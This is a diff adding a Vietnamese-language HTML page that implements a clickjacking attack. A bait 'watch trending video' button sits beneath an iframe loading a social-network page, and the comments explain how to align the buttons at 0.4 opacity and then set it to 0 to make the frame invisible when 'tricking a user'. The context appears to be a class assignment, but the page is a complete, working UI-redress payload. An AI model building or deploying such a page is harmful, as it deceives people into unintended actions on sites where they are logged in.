@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Xem Video Giải Trí Miễn Phí</title>
+    <style>
+        body { font-family: sans-serif; background-color: #1a1a1a; color: white; text-align: center; margin-top: 80px; }
+        
+        /* Khung chứa ép hai lớp đè khít lên nhau */
+        .clickjacking-box { position: relative; width: 320px; height: 180px; margin: 40px auto; }
+        
+        /* LỚP NỀN (Hiển thị rõ): Nút xem video to màu xanh mồi nhử */
+        .btn-video-bait { position: absolute; top: 30px; left: 10px; width: 280px; height: 50px; background-color: #00a86b; color: white; font-size: 16px; font-weight: bold; border: none; border-radius: 6px; z-index: 1; cursor: pointer; }
+
+        /* LỚP PHỦ (Iframe chứa trang MXH nằm đè lên trên) */
+        .iframe-target { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 2;
+            /* GIAI ĐOẠN 1: Để opacity: 0.4 để bạn nhìn thấy đường mà căn chỉnh nút bấm */
+            opacity: 0.4; 
+            /* GIAI ĐOẠN 2: Khi nộp bài/lừa thử user, bạn sửa số 0.4 thành 0 để tàng hình hoàn toàn */
+        }
+    </style>
+</head>
+<body>
+
+    <h1>HỆ THỐNG PHÁT VIDEO CHẤT LƯỢNG CAO</h1>
+    <p>Bấm vào nút bên dưới để tải và xem đoạn video đang xu hướng.</p>
+    
+    <div class="clickjacking-box">
+        <button class="btn-video-bait">XEM VIDEO HOT TẠI ĐÂY</button>
+
+        <iframe class="iframe-target" src="mạng-xã-hội.html"></iframe>
+    </div>
+
+</body>
+</html>
